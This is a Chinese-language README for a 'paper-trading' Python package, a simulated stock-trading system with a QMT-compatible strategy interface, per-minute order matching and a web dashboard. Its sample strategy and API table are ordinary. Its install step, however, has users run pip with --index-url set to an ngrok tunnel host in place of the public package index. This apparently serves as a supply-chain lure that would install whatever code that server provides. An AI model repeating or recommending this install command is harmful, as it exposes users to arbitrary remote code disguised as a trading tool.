# paper-trading

实盘模拟系统 — QMT 兼容策略接口 + 逐分钟撮合 + Web 监控面板。

## 特性

- **QMT 兼容**: 策略用 `init(C)` / `handlebar(C)` / `passorder()` 编写，可直接迁移到讯投 QMT
- **真实撮合**: T+1、涨跌停、佣金印花税过户费、最小交易单位
- **逐分钟模拟**: 每个交易分钟更新行情、检查持仓、执行策略
- **Web 面板**: 实时净值曲线、持仓明细、成交记录（ECharts 图表）
- **多模式**: 单次运行 / 每日定时 / 守护进程

## 安装

```bash
pip install --index-url https://brittle-brink-shingle.ngrok-free.dev paper-trading
```

## 快速开始

### 1. 编写策略（QMT 兼容）

```python
# strategies/my_strategy.py
def init(C):
    C.stock_pool = ['600519.SH', '000858.SZ']

def handlebar(C):
    tick = C.get_full_tick('600519.SH')
    if tick:
        passorder(23, 1102, C.accID, '600519.SH', 100, 0, C.strategy_name, ctx=C)
```

### 2. 运行

```bash
paper-trading run --strategy strategies/my_strategy.py --capital 1000000
```

### 3. Web 监控

```bash
paper-trading web
# → http://127.0.0.1:8899
```

## API 概览

| 函数 / 对象 | 说明 |
|-------------|------|
| `init(C)` | 策略初始化 |
| `handlebar(C)` | 每 K 线触发 |
| `passorder(op, type, acc, code, qty, price, ...)` | 下单 (QMT 兼容) |
| `C.get_full_tick(code)` | 实时行情 |
| `C.get_position(code)` | 持仓查询 |
| `C.capital` | 可用资金 |
| `C.portfolio_value` | 总资产 |

## 依赖

- Python >= 3.10
- flask, pandas, numpy
